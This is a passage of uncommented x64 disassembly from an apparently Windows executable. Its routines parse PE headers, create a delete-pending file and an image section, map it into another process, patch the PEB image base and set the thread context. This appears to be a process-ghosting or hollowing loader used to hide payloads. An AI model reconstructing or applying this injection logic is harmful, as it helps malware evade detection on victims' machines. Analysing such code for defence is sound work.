   140002675:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002679:	74 3f                	je     0x1400026ba
   14000267b:	31 c0                	xor    %eax,%eax
   14000267d:	48 8d 7c 24 68       	lea    0x68(%rsp),%rdi
   140002682:	b9 06 00 00 00       	mov    $0x6,%ecx
   140002687:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   14000268d:	f3 ab                	rep stos %eax,(%rdi)
   14000268f:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140002696:	00 
   140002697:	48 8d 3d c2 9a 57 00 	lea    0x579ac2(%rip),%rdi        # 0x14057c160
   14000269e:	48 89 d9             	mov    %rbx,%rcx
   1400026a1:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   1400026a6:	48 89 fa             	mov    %rdi,%rdx
   1400026a9:	e8 c0 0a 00 00       	call   0x14000316e
   1400026ae:	85 c0                	test   %eax,%eax
   1400026b0:	79 0f                	jns    0x1400026c1
   1400026b2:	48 89 d9             	mov    %rbx,%rcx
   1400026b5:	e8 e2 09 00 00       	call   0x14000309c
   1400026ba:	31 c0                	xor    %eax,%eax
   1400026bc:	e9 94 00 00 00       	jmp    0x140002755
   1400026c1:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400026c6:	31 c9                	xor    %ecx,%ecx
   1400026c8:	45 31 c0             	xor    %r8d,%r8d
   1400026cb:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400026d0:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   1400026d5:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400026da:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400026de:	89 06                	mov    %eax,(%rsi)
   1400026e0:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400026e7:	00 
   1400026e8:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   1400026ef:	00 
   1400026f0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400026f5:	e8 f9 09 00 00       	call   0x1400030f3
   1400026fa:	85 c0                	test   %eax,%eax
   1400026fc:	79 0a                	jns    0x140002708
   1400026fe:	48 89 d9             	mov    %rbx,%rcx
   140002701:	e8 96 09 00 00       	call   0x14000309c
   140002706:	eb 3f                	jmp    0x140002747
   140002708:	31 d2                	xor    %edx,%edx
   14000270a:	45 31 c9             	xor    %r9d,%r9d
   14000270d:	45 31 c0             	xor    %r8d,%r8d
   140002710:	48 89 d9             	mov    %rbx,%rcx
   140002713:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002718:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000271d:	8b 06                	mov    (%rsi),%eax
   14000271f:	31 d2                	xor    %edx,%edx
   140002721:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002726:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000272a:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   14000272f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002734:	e8 3f 09 00 00       	call   0x140003078
   140002739:	48 89 d9             	mov    %rbx,%rcx
   14000273c:	89 c7                	mov    %eax,%edi
   14000273e:	e8 59 09 00 00       	call   0x14000309c
   140002743:	85 ff                	test   %edi,%edi
   140002745:	79 09                	jns    0x140002750
   140002747:	31 c0                	xor    %eax,%eax
   140002749:	89 06                	mov    %eax,(%rsi)
   14000274b:	e9 6a ff ff ff       	jmp    0x1400026ba
   140002750:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140002755:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140002759:	5b                   	pop    %rbx
   14000275a:	5e                   	pop    %rsi
   14000275b:	5f                   	pop    %rdi
   14000275c:	c3                   	ret
   14000275d:	55                   	push   %rbp
   14000275e:	57                   	push   %rdi
   14000275f:	56                   	push   %rsi
   140002760:	53                   	push   %rbx
   140002761:	48 83 ec 58          	sub    $0x58,%rsp
   140002765:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   14000276c:	00 
   14000276d:	48 89 d7             	mov    %rdx,%rdi
   140002770:	44 89 c5             	mov    %r8d,%ebp
   140002773:	e8 5f fd ff ff       	call   0x1400024d7
   140002778:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000277f:	00 
   140002780:	e8 b7 fd ff ff       	call   0x14000253c
   140002785:	48 89 c6             	mov    %rax,%rsi
   140002788:	31 c0                	xor    %eax,%eax
   14000278a:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   14000278e:	74 42                	je     0x1400027d2
   140002790:	31 c0                	xor    %eax,%eax
   140002792:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   140002796:	45 31 c9             	xor    %r9d,%r9d
   140002799:	45 31 c0             	xor    %r8d,%r8d
   14000279c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400027a1:	31 d2                	xor    %edx,%edx
   1400027a3:	48 89 f1             	mov    %rsi,%rcx
   1400027a6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400027ab:	48 8d 05 ae 99 57 00 	lea    0x5799ae(%rip),%rax        # 0x14057c160
   1400027b2:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400027b7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400027bc:	e8 a8 08 00 00       	call   0x140003069
   1400027c1:	48 89 f1             	mov    %rsi,%rcx
   1400027c4:	89 c3                	mov    %eax,%ebx
   1400027c6:	e8 d1 08 00 00       	call   0x14000309c
   1400027cb:	89 d8                	mov    %ebx,%eax
   1400027cd:	f7 d0                	not    %eax
   1400027cf:	c1 e8 1f             	shr    $0x1f,%eax
   1400027d2:	48 83 c4 58          	add    $0x58,%rsp
   1400027d6:	5b                   	pop    %rbx
   1400027d7:	5e                   	pop    %rsi
   1400027d8:	5f                   	pop    %rdi
   1400027d9:	5d                   	pop    %rbp
   1400027da:	c3                   	ret
   1400027db:	57                   	push   %rdi
   1400027dc:	56                   	push   %rsi
   1400027dd:	53                   	push   %rbx
   1400027de:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   1400027e5:	31 c0                	xor    %eax,%eax
   1400027e7:	48 89 cb             	mov    %rcx,%rbx
   1400027ea:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
   1400027ef:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400027f4:	89 d6                	mov    %edx,%esi
   1400027f6:	f3 ab                	rep stos %eax,(%rdi)
   1400027f8:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
   1400027fd:	4c 89 c2             	mov    %r8,%rdx
   140002800:	4d 89 c8             	mov    %r9,%r8
   140002803:	48 89 f9             	mov    %rdi,%rcx
   140002806:	e8 ca f3 ff ff       	call   0x140001bd5
   14000280b:	89 f2                	mov    %esi,%edx
   14000280d:	48 89 d9             	mov    %rbx,%rcx
   140002810:	e8 6f f2 ff ff       	call   0x140001a84
   140002815:	41 89 f0             	mov    %esi,%r8d
   140002818:	48 89 da             	mov    %rbx,%rdx
   14000281b:	48 89 f9             	mov    %rdi,%rcx
   14000281e:	e8 3a ff ff ff       	call   0x14000275d
   140002823:	89 f2                	mov    %esi,%edx
   140002825:	48 89 d9             	mov    %rbx,%rcx
   140002828:	e8 57 f2 ff ff       	call   0x140001a84
   14000282d:	90                   	nop
   14000282e:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   140002835:	5b                   	pop    %rbx
   140002836:	5e                   	pop    %rsi
   140002837:	5f                   	pop    %rdi
   140002838:	c3                   	ret
   140002839:	56                   	push   %rsi
   14000283a:	53                   	push   %rbx
   14000283b:	48 83 ec 58          	sub    $0x58,%rsp
   14000283f:	31 d2                	xor    %edx,%edx
   140002841:	e8 8d fd ff ff       	call   0x1400025d3
   140002846:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000284b:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002851:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140002858:	00 
   140002859:	48 89 c6             	mov    %rax,%rsi
   14000285c:	4c 8d 44 24 3f       	lea    0x3f(%rsp),%r8
   140002861:	31 c0                	xor    %eax,%eax
   140002863:	c6 44 24 3f 01       	movb   $0x1,0x3f(%rsp)
   140002868:	48 89 f1             	mov    %rsi,%rcx
   14000286b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002870:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002875:	e8 c5 07 00 00       	call   0x14000303f
   14000287a:	48 89 f1             	mov    %rsi,%rcx
   14000287d:	89 c3                	mov    %eax,%ebx
   14000287f:	e8 18 08 00 00       	call   0x14000309c
   140002884:	89 d8                	mov    %ebx,%eax
   140002886:	f7 d0                	not    %eax
   140002888:	c1 e8 1f             	shr    $0x1f,%eax
   14000288b:	48 83 c4 58          	add    $0x58,%rsp
   14000288f:	5b                   	pop    %rbx
   140002890:	5e                   	pop    %rsi
   140002891:	c3                   	ret
   140002892:	57                   	push   %rdi
   140002893:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000289a:	31 c0                	xor    %eax,%eax
   14000289c:	49 89 c8             	mov    %rcx,%r8
   14000289f:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400028a4:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400028a9:	f3 ab                	rep stos %eax,(%rdi)
   1400028ab:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400028b0:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400028b5:	48 89 f9             	mov    %rdi,%rcx
   1400028b8:	e8 81 fa ff ff       	call   0x14000233e
   1400028bd:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400028c2:	48 89 f9             	mov    %rdi,%rcx
   1400028c5:	e8 98 08 00 00       	call   0x140003162
   1400028ca:	f7 d0                	not    %eax
   1400028cc:	c1 e8 1f             	shr    $0x1f,%eax
   1400028cf:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400028d6:	5f                   	pop    %rdi
   1400028d7:	c3                   	ret
   1400028d8:	48 83 ec 48          	sub    $0x48,%rsp
   1400028dc:	31 c0                	xor    %eax,%eax
   1400028de:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400028e2:	ba 08 00 00 00       	mov    $0x8,%edx
   1400028e7:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1400028ec:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400028f1:	e8 4e 08 00 00       	call   0x140003144
   1400028f6:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400028fb:	48 85 c9             	test   %rcx,%rcx
   1400028fe:	75 04                	jne    0x140002904
   140002900:	31 c0                	xor    %eax,%eax
   140002902:	eb 2b                	jmp    0x14000292f
   140002904:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140002909:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000290f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002914:	ba 14 00 00 00       	mov    $0x14,%edx
   140002919:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000291e:	e8 81 08 00 00       	call   0x1400031a4
   140002923:	85 c0                	test   %eax,%eax
   140002925:	78 d9                	js     0x140002900
   140002927:	83 7c 24 30 00       	cmpl   $0x0,0x30(%rsp)
   14000292c:	0f 95 c0             	setne  %al
   14000292f:	48 83 c4 48          	add    $0x48,%rsp
   140002933:	c3                   	ret
   140002934:	53                   	push   %rbx
   140002935:	48 83 ec 70          	sub    $0x70,%rsp
   140002939:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000293f:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140002944:	48 89 ca             	mov    %rcx,%rdx
   140002947:	48 89 d9             	mov    %rbx,%rcx
   14000294a:	e8 eb ea ff ff       	call   0x14000143a
   14000294f:	31 d2                	xor    %edx,%edx
   140002951:	31 c0                	xor    %eax,%eax
   140002953:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140002958:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   14000295d:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002962:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   140002967:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000296c:	ba 00 00 02 00       	mov    $0x20000,%edx
   140002971:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002976:	c7 44 24 40 30 00 00 	movl   $0x30,0x40(%rsp)
   14000297d:	00 
   14000297e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002983:	c7 44 24 58 40 00 00 	movl   $0x40,0x58(%rsp)
   14000298a:	00 
   14000298b:	e8 20 08 00 00       	call   0x1400031b0
   140002990:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002995:	89 c3                	mov    %eax,%ebx
   140002997:	e8 00 07 00 00       	call   0x14000309c
   14000299c:	89 d8                	mov    %ebx,%eax
   14000299e:	f7 d0                	not    %eax
   1400029a0:	c1 e8 1f             	shr    $0x1f,%eax
   1400029a3:	48 83 c4 70          	add    $0x70,%rsp
   1400029a7:	5b                   	pop    %rbx
   1400029a8:	c3                   	ret
   1400029a9:	57                   	push   %rdi
   1400029aa:	56                   	push   %rsi
   1400029ab:	53                   	push   %rbx
   1400029ac:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   1400029b0:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400029b6:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   1400029bb:	48 89 d3             	mov    %rdx,%rbx
   1400029be:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   1400029c3:	48 89 ca             	mov    %rcx,%rdx
   1400029c6:	48 89 f9             	mov    %rdi,%rcx
   1400029c9:	e8 6c ea ff ff       	call   0x14000143a
   1400029ce:	48 89 da             	mov    %rbx,%rdx
   1400029d1:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400029d7:	31 db                	xor    %ebx,%ebx
   1400029d9:	48 89 f1             	mov    %rsi,%rcx
   1400029dc:	e8 59 ea ff ff       	call   0x14000143a
   1400029e1:	31 d2                	xor    %edx,%edx
   1400029e3:	31 c0                	xor    %eax,%eax
   1400029e5:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400029ea:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   1400029ef:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400029f4:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   1400029f9:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   1400029fe:	ba 06 00 03 00       	mov    $0x30006,%edx
   140002a03:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140002a0a:	00 
   140002a0b:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002a10:	c7 44 24 68 40 00 00 	movl   $0x40,0x68(%rsp)
   140002a17:	00 
   140002a18:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140002a1d:	e8 8e 07 00 00       	call   0x1400031b0
   140002a22:	85 c0                	test   %eax,%eax
   140002a24:	78 14                	js     0x140002a3a
   140002a26:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002a2b:	48 89 f2             	mov    %rsi,%rdx
   140002a2e:	e8 aa 07 00 00       	call   0x1400031dd
   140002a33:	f7 d0                	not    %eax
   140002a35:	89 c3                	mov    %eax,%ebx
   140002a37:	c1 eb 1f             	shr    $0x1f,%ebx
   140002a3a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002a3f:	e8 58 06 00 00       	call   0x14000309c
   140002a44:	89 d8                	mov    %ebx,%eax
   140002a46:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140002a4a:	5b                   	pop    %rbx
   140002a4b:	5e                   	pop    %rsi
   140002a4c:	5f                   	pop    %rdi
   140002a4d:	c3                   	ret
   140002a4e:	90                   	nop
   140002a4f:	90                   	nop
   140002a50:	31 c0                	xor    %eax,%eax
   140002a52:	48 85 c9             	test   %rcx,%rcx
   140002a55:	74 21                	je     0x140002a78
   140002a57:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002a5c:	75 1a                	jne    0x140002a78
   140002a5e:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002a62:	81 fa 00 04 00 00    	cmp    $0x400,%edx
   140002a68:	7f 0e                	jg     0x140002a78
   140002a6a:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140002a6e:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002a74:	74 02                	je     0x140002a78
   140002a76:	31 c0                	xor    %eax,%eax
   140002a78:	c3                   	ret
   140002a79:	48 83 ec 28          	sub    $0x28,%rsp
   140002a7d:	e8 ce ff ff ff       	call   0x140002a50
   140002a82:	31 d2                	xor    %edx,%edx
   140002a84:	48 85 c0             	test   %rax,%rax
   140002a87:	74 03                	je     0x140002a8c
   140002a89:	8b 50 28             	mov    0x28(%rax),%edx
   140002a8c:	89 d0                	mov    %edx,%eax
   140002a8e:	48 83 c4 28          	add    $0x28,%rsp
   140002a92:	c3                   	ret
   140002a93:	57                   	push   %rdi
   140002a94:	56                   	push   %rsi
   140002a95:	53                   	push   %rbx
   140002a96:	48 81 ec f0 04 00 00 	sub    $0x4f0,%rsp
   140002a9d:	31 c0                	xor    %eax,%eax
   140002a9f:	48 89 cb             	mov    %rcx,%rbx
   140002aa2:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140002aa7:	b9 34 01 00 00       	mov    $0x134,%ecx
   140002aac:	48 89 d6             	mov    %rdx,%rsi
   140002aaf:	f3 ab                	rep stos %eax,(%rdi)
   140002ab1:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ab5:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140002aba:	c7 44 24 50 02 00 10 	movl   $0x100002,0x50(%rsp)
   140002ac1:	00 
   140002ac2:	48 89 fa             	mov    %rdi,%rdx
   140002ac5:	e8 0e 06 00 00       	call   0x1400030d8
   140002aca:	89 c2                	mov    %eax,%edx
   140002acc:	31 c0                	xor    %eax,%eax
   140002ace:	85 d2                	test   %edx,%edx
   140002ad0:	78 19                	js     0x140002aeb
   140002ad2:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ad6:	48 89 fa             	mov    %rdi,%rdx
   140002ad9:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140002ae0:	00 
   140002ae1:	e8 fe 05 00 00       	call   0x1400030e4
   140002ae6:	f7 d0                	not    %eax
   140002ae8:	c1 e8 1f             	shr    $0x1f,%eax
   140002aeb:	48 81 c4 f0 04 00 00 	add    $0x4f0,%rsp
   140002af2:	5b                   	pop    %rbx
   140002af3:	5e                   	pop    %rsi
   140002af4:	5f                   	pop    %rdi
   140002af5:	c3                   	ret
   140002af6:	57                   	push   %rdi
   140002af7:	48 81 ec f0 04 00 00 	sub    $0x4f0,%rsp
   140002afe:	31 c0                	xor    %eax,%eax
   140002b00:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002b05:	49 89 c8             	mov    %rcx,%r8
   140002b08:	b9 34 01 00 00       	mov    $0x134,%ecx
   140002b0d:	48 89 d7             	mov    %rdx,%rdi
   140002b10:	f3 ab                	rep stos %eax,(%rdi)
   140002b12:	49 8b 48 08          	mov    0x8(%r8),%rcx
   140002b16:	c7 44 24 50 02 00 10 	movl   $0x100002,0x50(%rsp)
   140002b1d:	00 
   140002b1e:	e8 b5 05 00 00       	call   0x1400030d8
   140002b23:	89 c2                	mov    %eax,%edx
   140002b25:	31 c0                	xor    %eax,%eax
   140002b27:	85 d2                	test   %edx,%edx
   140002b29:	78 08                	js     0x140002b33
   140002b2b:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002b32:	00 
   140002b33:	48 81 c4 f0 04 00 00 	add    $0x4f0,%rsp
   140002b3a:	5f                   	pop    %rdi
   140002b3b:	c3                   	ret
   140002b3c:	53                   	push   %rbx
   140002b3d:	48 83 ec 40          	sub    $0x40,%rsp
   140002b41:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140002b46:	4c 89 c3             	mov    %r8,%rbx
   140002b49:	e8 2b ff ff ff       	call   0x140002a79
   140002b4e:	4c 89 c1             	mov    %r8,%rcx
   140002b51:	89 c2                	mov    %eax,%edx
   140002b53:	48 03 54 24 58       	add    0x58(%rsp),%rdx
   140002b58:	e8 36 ff ff ff       	call   0x140002a93
   140002b5d:	85 c0                	test   %eax,%eax
   140002b5f:	75 04                	jne    0x140002b65
   140002b61:	31 c0                	xor    %eax,%eax
   140002b63:	eb 3a                	jmp    0x140002b9f
   140002b65:	48 89 d9             	mov    %rbx,%rcx
   140002b68:	e8 89 ff ff ff       	call   0x140002af6
   140002b6d:	48 85 c0             	test   %rax,%rax
   140002b70:	74 ef                	je     0x140002b61
   140002b72:	31 d2                	xor    %edx,%edx
   140002b74:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140002b7a:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140002b7f:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002b84:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140002b88:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002b8d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002b92:	48 8b 0b             	mov    (%rbx),%rcx
   140002b95:	e8 65 05 00 00       	call   0x1400030ff
   140002b9a:	f7 d0                	not    %eax
   140002b9c:	c1 e8 1f             	shr    $0x1f,%eax
   140002b9f:	48 83 c4 40          	add    $0x40,%rsp
   140002ba3:	5b                   	pop    %rbx
   140002ba4:	c3                   	ret
   140002ba5:	48 83 ec 68          	sub    $0x68,%rsp
   140002ba9:	45 31 c9             	xor    %r9d,%r9d
   140002bac:	45 31 c0             	xor    %r8d,%r8d
   140002baf:	48 89 c8             	mov    %rcx,%rax
   140002bb2:	48 89 d1             	mov    %rdx,%rcx
   140002bb5:	31 d2                	xor    %edx,%edx
   140002bb7:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140002bbc:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   140002bc1:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140002bc6:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140002bcb:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002bd0:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140002bd5:	48 89 c2             	mov    %rax,%rdx
   140002bd8:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   140002bdd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002be2:	45 31 c9             	xor    %r9d,%r9d
   140002be5:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
   140002bec:	00 
   140002bed:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140002bf4:	00 
   140002bf5:	e8 b1 04 00 00       	call   0x1400030ab
   140002bfa:	3d 03 00 00 40       	cmp    $0x40000003,%eax
   140002bff:	74 06                	je     0x140002c07
   140002c01:	31 d2                	xor    %edx,%edx
   140002c03:	85 c0                	test   %eax,%eax
   140002c05:	75 05                	jne    0x140002c0c
   140002c07:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140002c0c:	48 89 d0             	mov    %rdx,%rax
   140002c0f:	48 83 c4 68          	add    $0x68,%rsp
   140002c13:	c3                   	ret
   140002c14:	55                   	push   %rbp
   140002c15:	57                   	push   %rdi
   140002c16:	56                   	push   %rsi
   140002c17:	53                   	push   %rbx
   140002c18:	48 83 ec 78          	sub    $0x78,%rsp
   140002c1c:	48 89 d6             	mov    %rdx,%rsi
   140002c1f:	44 89 c7             	mov    %r8d,%edi
   140002c22:	e8 15 f9 ff ff       	call   0x14000253c
   140002c27:	48 89 c3             	mov    %rax,%rbx
   140002c2a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002c2e:	75 09                	jne    0x140002c39
   140002c30:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002c34:	e9 ac 00 00 00       	jmp    0x140002ce5
   140002c39:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140002c40:	00 
   140002c41:	31 c9                	xor    %ecx,%ecx
   140002c43:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   140002c48:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002c4e:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140002c53:	4c 8d 44 24 57       	lea    0x57(%rsp),%r8
   140002c58:	48 89 ea             	mov    %rbp,%rdx
   140002c5b:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   140002c60:	48 89 c1             	mov    %rax,%rcx
   140002c63:	c6 44 24 57 01       	movb   $0x1,0x57(%rsp)
   140002c68:	e8 d2 03 00 00       	call   0x14000303f
   140002c6d:	85 c0                	test   %eax,%eax
   140002c6f:	78 bf                	js     0x140002c30
   140002c71:	31 d2                	xor    %edx,%edx
   140002c73:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140002c77:	45 31 c9             	xor    %r9d,%r9d
   140002c7a:	45 31 c0             	xor    %r8d,%r8d
   140002c7d:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002c82:	48 89 d9             	mov    %rbx,%rcx
   140002c85:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002c8a:	31 d2                	xor    %edx,%edx
   140002c8c:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140002c91:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002c96:	e8 ce 03 00 00       	call   0x140003069
   140002c9b:	85 c0                	test   %eax,%eax
   140002c9d:	78 91                	js     0x140002c30
   140002c9f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002ca4:	31 c0                	xor    %eax,%eax
   140002ca6:	45 31 c9             	xor    %r9d,%r9d
   140002ca9:	45 31 c0             	xor    %r8d,%r8d
   140002cac:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002cb1:	ba 1f 00 0f 00       	mov    $0xf001f,%edx
   140002cb6:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002cbb:	c7 44 24 28 00 00 00 	movl   $0x1000000,0x28(%rsp)
   140002cc2:	01 
   140002cc3:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140002cca:	00 
   140002ccb:	e8 c0 03 00 00       	call   0x140003090
   140002cd0:	85 c0                	test   %eax,%eax
   140002cd2:	0f 85 58 ff ff ff    	jne    0x140002c30
   140002cd8:	48 89 d9             	mov    %rbx,%rcx
   140002cdb:	e8 bc 03 00 00       	call   0x14000309c
   140002ce0:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140002ce5:	48 83 c4 78          	add    $0x78,%rsp
   140002ce9:	5b                   	pop    %rbx
   140002cea:	5e                   	pop    %rsi
   140002ceb:	5f                   	pop    %rdi
   140002cec:	5d                   	pop    %rbp
   140002ced:	c3                   	ret
   140002cee:	41 54                	push   %r12
   140002cf0:	55                   	push   %rbp
   140002cf1:	57                   	push   %rdi
   140002cf2:	56                   	push   %rsi
   140002cf3:	53                   	push   %rbx
   140002cf4:	48 83 ec 60          	sub    $0x60,%rsp
   140002cf8:	48 89 d3             	mov    %rdx,%rbx
   140002cfb:	4c 89 c7             	mov    %r8,%rdi
   140002cfe:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   140002d05:	00 
   140002d06:	4c 89 cd             	mov    %r9,%rbp
   140002d09:	44 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%r8d
   140002d10:	00 
   140002d11:	e8 fe fe ff ff       	call   0x140002c14
   140002d16:	48 89 c6             	mov    %rax,%rsi
   140002d19:	48 8d 40 ff          	lea    -0x1(%rax),%rax
   140002d1d:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140002d21:	76 06                	jbe    0x140002d29
   140002d23:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140002d27:	eb 6c                	jmp    0x140002d95
   140002d29:	31 c0                	xor    %eax,%eax
   140002d2b:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   140002d32:	00 
   140002d33:	48 89 da             	mov    %rbx,%rdx
   140002d36:	49 89 f8             	mov    %rdi,%r8
   140002d39:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002d3d:	4c 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%r9
   140002d44:	00 
   140002d45:	4c 8d 64 24 48       	lea    0x48(%rsp),%r12
   140002d4a:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002d4f:	4c 89 e1             	mov    %r12,%rcx
   140002d52:	e8 a2 ee ff ff       	call   0x140001bf9
   140002d57:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140002d5c:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140002d60:	74 c1                	je     0x140002d23
   140002d62:	48 89 f2             	mov    %rsi,%rdx
   140002d65:	48 89 d9             	mov    %rbx,%rcx
   140002d68:	e8 38 fe ff ff       	call   0x140002ba5
   140002d6d:	48 89 c2             	mov    %rax,%rdx
   140002d70:	48 85 c0             	test   %rax,%rax
   140002d73:	74 ae                	je     0x140002d23
   140002d75:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140002d7c:	00 
   140002d7d:	4d 89 e0             	mov    %r12,%r8
   140002d80:	e8 b7 fd ff ff       	call   0x140002b3c
   140002d85:	84 c0                	test   %al,%al
